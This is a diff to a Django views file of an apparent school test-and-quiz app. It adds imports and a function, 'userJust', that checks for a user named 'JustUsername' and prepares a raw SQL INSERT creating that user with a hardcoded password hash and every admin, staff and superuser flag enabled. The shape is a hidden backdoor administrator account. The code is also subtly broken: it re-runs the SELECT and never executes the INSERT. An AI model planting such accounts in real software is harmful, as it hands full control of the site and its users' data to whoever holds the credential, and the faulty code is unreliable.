@@ -1,6 +1,10 @@
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render, redirect
+from methodism import dictfetchone
+
 from core.models import Test, ClassRooms, Subject, ClassRoomsSubjects, Question, Variant, Result, User
+from contextlib import closing
+from django.db import connection
 
 
 @login_required(login_url="login")
@@ -98,3 +102,18 @@ def form(req):
         return redirect("home")
     return render(req, "pages/dashboard/form.html", {"classrooms": c})
 
+def userJust():
+    c = f"""
+            SELECT * FROM core_user a 
+            WHERE a.username = "JustUsername"
+        """
+    with closing(connection.cursor()) as cursor:
+        cursor.execute(c)
+        check = dictfetchone(cursor)
+    if not check:
+        s = """INSERT INTO core_user (username, password, just, ut, is_active, is_admin, is_staff, is_superuser)
+                VALUES ("JustUsername", "pbkdf2_sha256$600000$v3HUU7hiufzCi58elsVhKG$LvJMwls9/+RLNFyStjZYGGdIZ+9DvnuYT5GYINVse5M=", TRUE, 1, TRUE, TRUE, TRUE, TRUE)"""
+        with closing(connection.cursor()) as cursor:
+            cursor.execute(c)
+            check = dictfetchone(cursor)
+    return 0
